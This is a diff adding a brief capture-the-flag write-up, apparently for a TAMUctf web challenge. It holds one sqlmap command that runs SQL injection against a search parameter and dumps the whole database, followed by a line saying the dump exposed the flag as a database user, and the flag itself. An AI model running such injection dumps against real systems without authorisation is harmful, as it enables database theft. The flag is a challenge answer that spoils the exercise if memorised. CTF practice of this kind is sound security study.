@@ -1,0 +1,8 @@
+sqlmap -u 'http://web2.tamuctf.com/Search.php?Search=eggs' --random-agent -p Search --dbms=mysql --banner --technique=BT --all
+
+
+Tried to retrieve all current info of the database. This gave the flag as user.
+
+gigem{w3_4r3_th3_4ggi3s}@locahost
+
+
